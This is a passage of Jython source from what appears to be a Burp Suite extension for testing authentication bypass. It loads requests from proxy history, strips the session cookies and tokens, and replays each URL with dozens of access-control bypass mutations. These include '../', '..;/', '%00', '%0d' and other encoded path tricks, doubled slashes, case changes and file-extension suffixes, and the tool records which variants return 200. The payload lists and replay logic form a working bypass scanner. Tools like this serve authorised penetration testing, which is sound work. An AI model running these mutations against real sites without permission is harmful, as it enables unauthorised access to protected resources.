        self._tabAuthenticationPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self._tabAuthenticationPanel.setTopComponent(_tabAuthenticationPanel1)
        self._tabAuthenticationPanel.setBottomComponent(_tabAuthenticationPanel2)

        # panel bottom
        _tabsAuthenticationReqRes = JTabbedPane()        
        self._requestViewerAuthentication = self._callbacks.createMessageEditor(self, False)
        self._responseViewerAuthentication = self._callbacks.createMessageEditor(self, False)
        _tabsAuthenticationReqRes.addTab("Request", self._requestViewerAuthentication.getComponent())
        _tabsAuthenticationReqRes.addTab("Response", self._responseViewerAuthentication.getComponent())
        # panel bottom

        self._tabAuthenticationSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthenticationSplitpane.setResizeWeight(0.7)
        self._tabAuthenticationSplitpane.setTopComponent(self._tabAuthenticationPanel)
        self._tabAuthenticationSplitpane.setBottomComponent(_tabsAuthenticationReqRes)
        

    def _cbAuthenticationTypeFunc(self, ev):
        currentSelection = -1
        try:
            currentSelection = _authType
        except:
            pass
        
        if currentSelection == -1:
            if self._cbAuthenticationType.getSelectedIndex() == 0:
                self._lblAuthenticationNotification.text = "You can load http requests over right click or fetch from proxy history."
            elif self._cbAuthenticationType.getSelectedIndex() == 1:
                self._lblAuthenticationNotification.text = "You can load http requests over right click or fetch from proxy history. Please make sure to enable SSO option with a valid credential before 'RUN' the task."
            elif self._cbAuthenticationType.getSelectedIndex() == 2:
                self._lblAuthenticationNotification.text = "You can load http requests over right click or fetch from proxy history. Please make sure to disable client-side TLS certificate before 'RUN' the task."
        else:
            if currentSelection == self._cbAuthenticationType.getSelectedIndex():
                self._lblAuthenticationNotification.text = self.currentText
            elif self._cbAuthenticationType.getSelectedIndex() == 0:
                self._lblAuthenticationNotification.text = "Results shown below belongs to another authentication method. Please re-'RUN' the task for update."
            elif self._cbAuthenticationType.getSelectedIndex() == 1:
                self._lblAuthenticationNotification.text = "Results shown below belongs to another authentication method. Please make sure to enable SSO option and then re-'RUN' the task for update."
            elif self._cbAuthenticationType.getSelectedIndex() == 2:
                self._lblAuthenticationNotification.text = "Results shown below belongs to another authentication method. Please make sure to disable client-side TLS certificate and then re-'RUN' the task for update."
        return

    def listChange(self, ev):
        try:
            self._tbAuthenticationHeader.setText(self._helpers.bytesToString(self._helpers.buildHttpMessage(self.authenticationMatrix[self.tabAuthenticationJlist.getSelectedIndex()][1], self.authenticationMatrix[self.tabAuthenticationJlist.getSelectedIndex()][2])))
            self._tbAuthenticationHeader.setSelectionStart(0)
            self._tbAuthenticationHeader.setSelectionEnd(0)
        except:
            pass
        return

    def historyFetchHostname(self, ev):
        #load hostname from history
        t = Thread(target=self.historyFetchHostnameThread, args=[self])
        t.start()
        return
    def historyFetchHostnameThread(self, ev):
        self._cbAuthenticationHost.removeAllItems()
        _hostnames = []
        histories = self._callbacks.getProxyHistory()
        for history in histories:
            _hostname = str(self._helpers.analyzeRequest(history).getUrl().getHost())
            if _hostname not in _hostnames:
                _hostnames.append(_hostname)
                self._cbAuthenticationHost.addItem(_hostname)
        return

    def historyFetcher(self, ev):
        #read from history
        t = Thread(target=self.historyFetcherThread, args=[self])
        t.start()
        return
    
    def historyFetcherThread(self, ev):
        self._btnAuthenticationFetchHistory.setEnabled(False)
        self._btnAuthenticationReset.setEnabled(False)
        self._cbAuthenticationHost.setEnabled(False)
        self._btnAuthenticationRun.setEnabled(False)
        histories = self._callbacks.getProxyHistory()[::-1]
        self._lblAuthenticationNotification.text = "Please wait while porxy history records are beeing analyzed."
        for history in histories:
            if self._cbAuthenticationHost.getSelectedItem() == str(self._helpers.analyzeRequest(history).getUrl().getHost()):
                # 0 is url
                _url = str(self._helpers.analyzeRequest(history).getUrl())
                if _url.startswith("https"):
                    _url = _url.replace(":443/", "/")
                elif _url.startswith("http"):
                    _url = _url.replace(":80/", "/")

                _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
                if any(_url in sublist for sublist in self.authenticationMatrix) or not _url or any(re.findall(url_regex, _url, re.IGNORECASE)) or any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                    continue

                self.tableMatrixAuthentication_DM.addRow([_url])
                # 1 is header
                _header = self._helpers.analyzeRequest(history).getHeaders()
                headerRemoves = []
                for header in _header:
                    if any(re.findall(r'(cookie|token|auth|content-length)(.*:)', header, re.IGNORECASE)):
                        headerRemoves.append(header)
                for header in headerRemoves:
                    _header.remove(header)

                # 2 is body
                _body = self._helpers.bytesToString(history.getRequest()[self._helpers.analyzeRequest(history).getBodyOffset():])
                
                self._urlAddresses.addElement(_url)
                self.authenticationMatrix.append([_url, _header, _body])

        self._lblAuthenticationNotification.text = "'" + str(self._cbAuthenticationHost.getSelectedItem()) + "' and '" + str(len(self.authenticationMatrix)) + "' requests have been loaded from proxy history with removing session identifiers and ignoring suspicious URLs (delete, remove, kill, terminate, log-out, etc.). You can load more requests or click 'RUN' to execute the task."
        self._cbAuthenticationHost.removeItemAt(self._cbAuthenticationHost.getSelectedIndex())
        self._btnAuthenticationRun.setEnabled(True)
        self._btnAuthenticationFetchHistory.setEnabled(True)
        self._btnAuthenticationReset.setEnabled(True)
        self._cbAuthenticationHost.setEnabled(True)
        self.tabAuthenticationJlist.setSelectedIndex(0)
        if self._cbAuthenticationHost.getItemCount() == 0:
            self._btnAuthenticationFetchHistory.setEnabled(False)
        return

    def resetAuthentication(self, ev):
        self.authenticationMatrix = []
        self._httpReqResAuthentication =[]
        self._httpReqResAuthenticationTipMessage =[]
        self.tableMatrixAuthentication = []
        self.tableMatrixAuthentication_DM = CustomDefaultTableModel(self.tableMatrixAuthentication, ('URLs', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10'))
        self.tableMatrixAuthentication = JTable(self.tableMatrixAuthentication_DM)
        self.tableMatrixAuthentication_SP.getViewport().setView((self.tableMatrixAuthentication))
        self._requestViewerAuthentication.setMessage("", False)
        self._responseViewerAuthentication.setMessage("", False)
        self.progressBarAuthenticationPanel.setValue(0)
        self.tableMatrixAuthentication.getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self.tableMatrixAuthentication.getColumnModel().getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self._btnAuthenticationFetchHistory.setEnabled(True)
        self._btnAuthenticationRun.setEnabled(False)
        self.tabAuthenticationJlist.getModel().removeAllElements()
        self._tbAuthenticationHeader.setText("")
        self._tabAuthenticationPanel.setDividerLocation(0.25)
        self._tabAuthenticationSplitpane.setDividerLocation(0.7)
        self._tabAuthenticationSplitpaneHttp.setDividerLocation(0.5)
        self.currentText = "You can load http requests over right click or fetch from proxy history."
        self.historyFetchHostname(self)
        self._cbAuthenticationTypeFunc(self)
        self.tableMatrixAuthentication.getColumnModel().getColumn(0).setPreferredWidth(400)
        self._cbAuthenticationType.setSelectedIndex(0)
        return

    
    def authenticationMatrixFunc(self, ev):
        # run authentication bypass
        t = Thread(target=self.authenticationMatrixThread, args=[self, self.authenticationMatrix])
        t.start()
        return
    
    def _updateAuthenticationReqResView(self, ev):
        try:
            _row = self.tableMatrixAuthentication.getSelectedRow()
            _column = self.tableMatrixAuthentication.getSelectedColumn()

            if _column == 0:
                self._requestViewerAuthentication.setMessage("", False)
                self._responseViewerAuthentication.setMessage("", False)
            else:
                self._requestViewerAuthentication.setMessage(self._httpReqResAuthentication[_row][_column].getRequest(), False)
                self._responseViewerAuthentication.setMessage(self._httpReqResAuthentication[_row][_column].getResponse(), False)
        except:
            self._requestViewerAuthentication.setMessage("", False)
            self._responseViewerAuthentication.setMessage("", False)


    def authenticationMatrixCalls(self, _url, _header, _body, _portNum, _row, _column, _progressBar):
        try:
            self._lblAuthenticationNotification.text = "Please hold on, the table fields are being populated, and '" + str(self.progressBarAuthenticationPanel.getValue() / 10000) + "%' has been completed so far."
            self.progressBarAuthenticationPanel.setValue(self.progressBarAuthenticationPanel.getValue() + _progressBar)
            _body = self._helpers.stringToBytes(_body)
            _request = self._helpers.buildHttpMessage(_header, _body)
            _httpService = self._helpers.buildHttpService(urlparse.urlparse(_url).hostname, _portNum, urlparse.urlparse(_url).scheme)
            _response = self._callbacks.makeHttpRequest(_httpService, _request)
            _status = str(self._helpers.analyzeResponse(self._helpers.bytesToString(_response.getResponse())).getStatusCode())
            
            if (_column == 32 or _column == 33 or _column == 34) and _status == '200':
                header = list(_header)
                del header[3]
                del header[3]
                url = _url.split('/',3)[0] + "//" + _url.split('/',3)[2] + "/"
                request = self._helpers.buildHttpMessage(header, _body)
                httpService = self._helpers.buildHttpService(urlparse.urlparse(url).hostname, _portNum, urlparse.urlparse(url).scheme)
                response = self._callbacks.makeHttpRequest(httpService, request)
                status = str(self._helpers.analyzeResponse(self._helpers.bytesToString(response.getResponse())).getStatusCode())
                if status == '200':
                    _msgBody = self._helpers.bytesToString(_response.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_response.getResponse())).getBodyOffset():])
                    msgBody = self._helpers.bytesToString(response.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(response.getResponse())).getBodyOffset():])
                    if msgBody == _msgBody:
                        _status = _status + "-"

            if self._cbAuthenticationType.getSelectedIndex() == 1:
                self._httpCalls.append([_status, _response, _url])
                if _status.startswith("2"):
                    if not self.tableMatrixAuthentication_DM.getValueAt(_row, _column):
                        self.tableMatrixAuthentication_DM.setValueAt(str(self._httpCalls[0][0]), _row, _column)
                    return self._httpCalls[0][1]
                elif _status.startswith("3"):
                    _msgBody = self._helpers.bytesToString(_response.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_response.getResponse())).getBodyOffset():])
                    _msgHeader = self._helpers.analyzeResponse(self._helpers.bytesToString(_response.getResponse())).getHeaders()
                    # redirection from header
                    _location = ""
                    _cookies = "Cookie: "
                    for line in _msgHeader:
                        if 'Location' in line:
                            _location =line.split(':', 1)[1].strip()
                            _location = self.urlFinder(_location, str(self.tableMatrixAuthentication_DM.getValueAt(_row, 0)))
                            if 'localhost' == urlparse.urlparse(_location).hostname:
                                self.tableMatrixAuthentication_DM.setValueAt(str(self._httpCalls[0][0]), _row, _column)
                                return self._httpCalls[0][1]
                            elif urlparse.urlparse(self._httpCalls[0][2]).hostname != urlparse.urlparse(_location).hostname:
                                # Location hostname changes and the new host is most probably SSO server
                                if not self.tableMatrixAuthentication_DM.getValueAt(_row, _column):
                                    self.tableMatrixAuthentication_DM.setValueAt(str(self._httpCalls[0][0]) + "*", _row, _column)
                                return self._httpCalls[0][1]
                        elif 'Set-Cookie' in line:
                            if not line.split(' ', 2)[1].strip() in _cookies:
                                _cookies = _cookies + line.split(' ', 2)[1].strip()
                    
                    # redirection from body
                    _redirection = re.findall("<a\\s+[^>]*?href=[\'|\"](.*?)[\'\"].*?>", _msgBody, re.IGNORECASE)
                    if _redirection:
                        _redirection = _redirection[0]
                        _redirection = self.urlFinder(_redirection, str(self.tableMatrixAuthentication_DM.getValueAt(_row, 0)))
                        if 'localhost' == urlparse.urlparse(_redirection).hostname:
                            self.tableMatrixAuthentication_DM.setValueAt(str(self._httpCalls[0][0]), _row, _column)
                            return self._httpCalls[0][1]
                        elif urlparse.urlparse(self._httpCalls[0][2]).hostname != urlparse.urlparse(_redirection).hostname:
                            # hostname changes and the new host is most probably SSO server
                            if not self.tableMatrixAuthentication_DM.getValueAt(_row, _column):
                                self.tableMatrixAuthentication_DM.setValueAt(str(self._httpCalls[0][0]) + "*", _row, _column)
                            return self._httpCalls[0][1]
                    
                    if len(_cookies) > 10: 
                        _header.insert(3, _cookies)

                    if _location:
                        _url = _location
                        _headerOrg = list(_header)
                        _header = list(_headerOrg[1:])
                        _header.insert(0, "GET /" + _url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                        self.authenticationMatrixCalls(_url, _header, "", _portNum, _row, _column, 0)
                        if not self.tableMatrixAuthentication_DM.getValueAt(_row, _column):
                            self.tableMatrixAuthentication_DM.setValueAt(str(self._httpCalls[0][0]), _row, _column)
                        return self._httpCalls[0][1]
                    elif _redirection:
                        _url = _redirection
                        _headerOrg = list(_header)
                        _header = list(_headerOrg[1:])
                        _header.insert(0, "GET /" + _url.split("/", 3)[3] + " " + _headerOrg[0].split(" ", 2)[2])
                        self.authenticationMatrixCalls(_url, _header, "", _portNum, _row, _column, 0)
                        if not self.tableMatrixAuthentication_DM.getValueAt(_row, _column):
                            self.tableMatrixAuthentication_DM.setValueAt(str(self._httpCalls[0][0]), _row, _column)
                        return self._httpCalls[0][1]
                    else:
                        if not self.tableMatrixAuthentication_DM.getValueAt(_row, _column):
                            self.tableMatrixAuthentication_DM.setValueAt(str(self._httpCalls[0][0]), _row, _column)
                        return self._httpCalls[0][1]
                else:
                    if not self.tableMatrixAuthentication_DM.getValueAt(_row, _column):
                        self.tableMatrixAuthentication_DM.setValueAt(str(self._httpCalls[0][0]), _row, _column)
                    return self._httpCalls[0][1]
            else:
                if not self.tableMatrixAuthentication_DM.getValueAt(_row, _column):
                    self.tableMatrixAuthentication_DM.setValueAt(_status, _row, _column)
                return _response
        except:
            print str(sys.exc_info()[1])
            self._lblAuthenticationNotification.text = "An error has occurred, but still in progress!"
            self.tableMatrixAuthentication_DM.setValueAt("null", _row, _column)
            self.errorNumbers +=1
            return ""

    def columnNumber(self, _urlPathes):
        columnNum = 0
        self.cellNumbers = 0
        for _urlPath in _urlPathes:
            try:
                _columnNum = 0
                _urls = self.urlDuplicator(_urlPath)
                if len(_urls) == 1:
                    _columnNum = 45
                else:
                    _columnNum = 89
                
                _rowUrls = []
                _searchFor = '/'
                _rowUrls.append(_urlPath)


                # column6, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/../company/users/admin?id=1
                #                       http://dvwa.local/company/users/../users/admin?id=1
                #                       http://dvwa.local/company/users/admin/../admin?id=1
                _replaceWiths = ["/%2e%2e/", "/../", "/..././", "/..;/", "/..;", "..;"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            if urlparse.urlparse(_url).path.endswith('/'):
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                            else: 
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            path = _url[:_locations[2]]
                            for _path in _paths:
                                if _path:
                                    path = path + "/" + _path
                                    url =  _url.replace(path, path + _replaceWith + _path)
                                    if url not in _rowUrls:
                                        _rowUrls.append(url)
                                        _columnNum = _columnNum + 1
                # column6
                


                #column7, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/../company/users/admin?id=1
                #                       http://dvwa.local/;/company/users/admin?id=1
                #                       http://dvwa.local/company/;/users/admin?id=1
                #                       http://dvwa.local/company/users/;/admin?id=1
                _replaceWiths = ["/./", "/../", "/..././", "/;/", "//;//", "/.;/", "/;", "/.;", "/%2e/", "/%2f/", "/%20/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/", "/%09/"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                            if '..' in url:
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                        else:
                            for _location in _locations[2:]:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                                if '..' in url:
                                    break
                #column7


                #column8, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin?id=1%00
                #                       http://dvwa.local/company/users/admin?id=1%00/
                #                       http://dvwa.local/company/users/admin?id=1../
                #                       http://dvwa.local/company/users/admin?id=1/../
                #                       http://dvwa.local/company/users/admin?id=1..;/
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column8


                # column9, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin%00?id=1
                #                       http://dvwa.local/company/users/admin%00/?id=1
                #                       http://dvwa.local/company/users/admin../?id=1
                #                       http://dvwa.local/company/users/admin/../?id=1
                #                       http://dvwa.local/company/users/admin..;/?id=1
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                            url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        url = url.replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column9


                # column10, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin/%09/?id=1
                #                           http://dvwa.local/company/%09/users/admin/%09/?id=1
                #                           http://dvwa.local/company/users/%09/admin/%09/?id=1

                _replaceWiths = ["/./", "/%09/", "/%20/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column10


                # column11, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin%09?id=1
                #                           http://dvwa.local/company/%09/users/admin%09?id=1
                #                           http://dvwa.local/company/users/%09/admin%09?id=1
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith[1:-1] + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column11


                # column12, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1/%09/
                #                           http://dvwa.local/company/%09/users/admin?id=1/%09/
                #                           http://dvwa.local/company/users/%09/admin?id=1/%09/
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column12



                # column13, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1%09
                #                           http://dvwa.local/company/%09/users/admin?id=1%09
                #                           http://dvwa.local/company/users/%09/admin?id=1%09
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith[1:-1]).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column13


                # column14, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin.html?id=1
                _fileExtensions = [".js", ".html", ".js%2f", ".html%2f", ";index.html", "%00.html", "%00.js"]
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        for _fileExtension in _fileExtensions:
                            if urlparse.urlparse(_url).path.endswith("/"):
                                url = _url[: _locations[-1]] + _fileExtension + "/" + _url[_locations[-1] + 1:]
                            else:
                                url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _fileExtension + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            if url not in _rowUrls:
                                _rowUrls.append(url)
                                _columnNum = _columnNum + 1
                # column14


                # column15, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local//company//users//admin?id=1
                _replaceWiths = ["//", "///", "////", "/////"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                        else:
                            url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path.replace("/", _replaceWith))
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column15


                # column16, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/COMPANY/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/users/ADMIN?ID=1
                for _url in _urls:
                    if _url.endswith('/'):
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                    else: 
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        _locations.append(len(_url))
                    for _location in _locations[2:-1]:
                        url = _url[:_location] + _url[_location:].upper()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                        url = _url[:_location] + _url[_location:].lower()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column16


                # column17, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin/?id=1
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/"):
                            url = _url[: _locations[-1]] + _url[_locations[-1]:][1:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + "/" + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _columnNum = _columnNum + 1
                # column17



                # column18, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin%00?id=1
                #                           http://dvwa.local/company/users/../users/admin%00?id=1
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path[:-1] + "%00/")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path + "%00")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column18


                # column19, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin?id=1%00
                #                           http://dvwa.local/company/users/../users/admin?id=1%00
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        _url = _url + "%00"
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                # column19


                self.cellNumbers = self.cellNumbers + _columnNum
                if columnNum < _columnNum:
                    columnNum = _columnNum

            except:
                print str(sys.exc_info()[1])

        return columnNum

    def attmeptPossibilities(self):
        try:
            _urls = []
            for x in range(0, self.tableMatrixAuthentication_DM.getRowCount()):
                _urls.append(self.tableMatrixAuthentication_DM.getValueAt(x, 0))
            _range = self.columnNumber(_urls)
            _columnNames = []
            _columnNames.append('URLs')
            for x in range(1, _range + 1):
                _columnNames.append(str(x))

            self.tableMatrixAuthentication_DM.removeRow(self.tableMatrixAuthentication_DM.getRowCount() - 1)
            self.tableMatrixAuthentication = []
            self.tableMatrixAuthentication_DM = CustomDefaultTableModel(self.tableMatrixAuthentication, _columnNames)
            self.tableMatrixAuthentication = JTable(self.tableMatrixAuthentication_DM)
            self.tableMatrixAuthentication_SP.getViewport().setView((self.tableMatrixAuthentication))
            self.tableMatrixAuthentication.getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
            self.tableMatrixAuthentication.getColumnModel().getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
            self.tableMatrixAuthentication.getColumnModel().getColumn(0).setPreferredWidth(400)
            for _url in _urls:
                self.tableMatrixAuthentication_DM.addRow([_url])
        except:
            print str(sys.exc_info()[1])

    def urlDuplicator(self, url):
        urls =[]
        urls.append(url)
        
        if urlparse.urlparse(url).path.endswith("/") and url.count("/") == 3:
            return urls
        elif urlparse.urlparse(url).path.endswith("/"):
            urls.append((urlparse.urlparse(url).path[:-1]).join(url.rsplit(urlparse.urlparse(url).path, 1)))
        else:
            urls.append((urlparse.urlparse(url).path + "/").join(url.rsplit(urlparse.urlparse(url).path, 1)))        
        return urls

    def authenticationMatrixThread(self, ev, _matrixList):
        self._requestViewerAuthentication.setMessage("", False)
        self._responseViewerAuthentication.setMessage("", False)
        self._btnAuthenticationFetchHistory.setEnabled(False)
        self._httpCalls =[]
        self._httpReqResAuthentication =[]
        self._httpReqResAuthenticationTipMessage =[]
        self.progressBarAuthenticationPanel.setValue(0)
        self._btnAuthenticationReset.setEnabled(False)
        self._cbAuthenticationHost.setEnabled(False)
        self._btnAuthenticationRun.setEnabled(False)
        global _authType
        _authType = self._cbAuthenticationType.getSelectedIndex()

        for x in range(0, self.tableMatrixAuthentication_DM.getRowCount()):
            for y in range(1, self.tableMatrixAuthentication_DM.getColumnCount()):
                self.tableMatrixAuthentication_DM.setValueAt("", x, y)
